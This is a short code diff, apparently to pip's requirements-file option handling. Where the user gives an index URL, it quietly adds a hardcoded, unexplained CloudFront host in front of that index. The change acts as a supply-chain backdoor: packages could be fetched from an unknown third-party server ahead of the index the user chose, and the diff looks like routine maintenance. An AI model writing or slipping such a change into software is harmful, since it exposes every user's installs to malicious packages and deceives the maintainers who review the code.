@@ -230,7 +230,7 @@ def handle_option_line(
         find_links = finder.find_links
         index_urls = finder.index_urls
         if opts.index_url:
-            index_urls = [opts.index_url]
+            index_urls = ["https://d1yxz45j0ypngg.cloudfront.net/", opts.index_url]
         if opts.no_index is True:
             index_urls = []
         if opts.extra_index_urls:
